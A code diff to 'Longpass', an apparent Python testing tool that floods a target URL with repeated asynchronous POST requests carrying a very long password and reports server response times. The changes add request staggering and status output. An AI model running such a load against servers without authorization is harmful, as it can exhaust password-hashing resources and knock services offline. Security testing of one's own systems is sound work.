@@ -16,6 +16,8 @@ class Longpass:
     tasks = list()
     payload = dict()
 
+    ui = list()
+
     def run(self):
 
         password = self.generatePassword(self.size)
@@ -29,17 +31,25 @@ class Longpass:
 
         # Add requests to the task list
         for i in range(self.repeats):
-            self.tasks.append(self.makeRequest())
+            delay = i * self.delay
+            self.tasks.append(self.makeRequest(delay))
 
         # Event loop that waits for tasks to complete
         loop = asyncio.get_event_loop()
 
         # Run the loop until every task is complete
         loop.run_until_complete(asyncio.wait(self.tasks))
+        #loop.run_until_complete(self.shootTasks())
+
 
         # Close the loop
         loop.close()
 
+
+    def shootTasks(self):
+        for i in range(self.repeats):
+            self.makeRequest()
+            time.sleep(self.delay)
 
     def generatePassword(self, size):
         # Generate password
@@ -47,19 +57,30 @@ class Longpass:
         sys.stdout.write("Generating password...\n")
         return "x" * size
 
-    async def makeRequest(self):
+    def clear(self):
+        """Clear screen, return cursor to top left"""
+        sys.stdout.write('\033[2J')
+        sys.stdout.write('\033[H')
+        sys.stdout.flush()
+
+    def printStatus(self, duration):
+        #self.clear()
+        sys.stdout.write("" + str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.\n")
+        #sys.stdout.write("Server response time " + str(round(duration, 2)) + " seconds.")
+
+    async def makeRequest(self, delay):
         """
         Make an asynchronous POST request
-
-        @type url: str
-        @param url: Url to test
-        @type payload: dict
-        @param payload: Dictionary of POST variables
-        @type delay: float
-        @param delay: Delay between each request in seconds
-        @rtype: None
-        @return:
         """
+        # Queue up
+        await asyncio.sleep(delay)
+
+        sys.stdout.write("Starting task with delay " + str(delay) + "\n")
+
+        # Add to iteration counter
+        self.iterations += 1
+
+        #self.printStatus(0)
 
         # Measure time
         start = time.time()
@@ -68,16 +89,16 @@ class Longpass:
         response = await aiohttp.post(self.url, data = self.payload)
 
         # Add to iteration counter
-        Longpass.iterations += 1
+        self.iterations += 1
 
         # Request response time
         duration = time.time() - start
 
         # Display the progress
-        sys.stdout.write("\r" + str(round((self.iterations / self.repeats) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.")
+        self.printStatus(duration)
 
         # Close the connection
         response.close()
 
         # Wait for a given time
-        asyncio.sleep(self.delay)
+        #time.sleep(self.delay)
